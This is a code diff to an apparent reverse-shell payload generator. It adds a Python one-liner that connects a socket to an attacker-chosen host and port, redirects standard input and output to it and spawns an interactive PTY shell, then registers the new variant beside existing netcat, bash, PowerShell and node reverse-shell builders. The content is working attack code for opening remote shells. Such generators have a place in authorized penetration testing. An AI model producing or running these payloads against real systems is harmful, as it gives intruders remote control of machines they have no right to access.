@@ -21,6 +21,16 @@ def reverse_python(lhost: str, lport: int, shell: str = "/bin/bash") -> str:
     )
 
 
+def reverse_python_pty(lhost: str, lport: int, shell: str = "/bin/bash") -> str:
+    return (
+        "python3 -c 'import os,socket,pty;"
+        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+        f"s.connect((\"{lhost}\",{lport}));"
+        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+        f"pty.spawn(\"{shell}\")'"
+    )
+
+
 def reverse_nc(lhost: str, lport: int, shell: str = "/bin/bash") -> str:
     return f"nc -e {shell} {lhost} {lport}"
 
@@ -110,6 +120,7 @@ REGISTRY = {
     "bash_pty": lambda h, p: reverse_bash(h, p, pty=True),
     "bash_detached": reverse_bash_detached,
     "python": reverse_python,
+    "python_pty": reverse_python_pty,
     "nc": reverse_nc,
     "powershell": reverse_powershell,
     "node": js_child_process_reverse,
